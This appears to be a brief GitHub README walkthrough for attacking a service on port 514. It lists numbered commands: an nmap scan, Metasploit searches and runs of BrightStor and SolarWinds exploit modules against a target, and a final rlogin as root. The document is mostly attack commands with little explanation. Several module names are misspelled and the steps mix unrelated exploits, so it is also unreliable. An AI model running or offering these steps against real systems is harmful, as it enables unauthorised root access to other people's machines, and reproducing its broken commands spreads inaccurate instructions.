![image](https://github.com/thanawut2903/Port-514-tcpwrapped/assets/159118913/52ccff71-706a-4844-a148-626790310dd8)# Port-514-tcpwrapped
1.nmap -sV (target ip)

2.msfconsole 

3.msf 6 > search rlogin

4.msf 6 > use exploit/windows/brighstor/lgserver_rxrlogin

5.msf 6 > show options

![image](https://github.com/thanawut2903/Port-514-tcpwrapped/assets/159118913/a7da8010-0a33-4f95-b05a-3b9e9856c989)

6.msf 6 > set RHOST (target ip)

7.msf 6 > show target

8.msf 6 > run

9.msf 6 > use exploit/windows/http/solarwids_fsmuserlogin

![image](https://github.com/thanawut2903/Port-514-tcpwrapped/assets/159118913/9ae7b31c-2e51-4ab7-a7ce-9306ea3eb111)

10.msf 6 > set RHOST (target ip)

11.msf 6 > set vhost (target ip)

12.msf 6 > showtarget

13.msf 6 > run

![image](https://github.com/thanawut2903/Port-514-tcpwrapped/assets/159118913/93024b18-cb7a-44b4-a56e-e8549ff8d69d)

14.rlogin -l root (target ip)

![image](https://github.com/thanawut2903/Port-514-tcpwrapped/assets/159118913/e55b5edc-3797-4845-b528-ea837ce365ac)

Reference form : https://www.youtube.com/watch?v=zyILGFWvAVs&t=819s

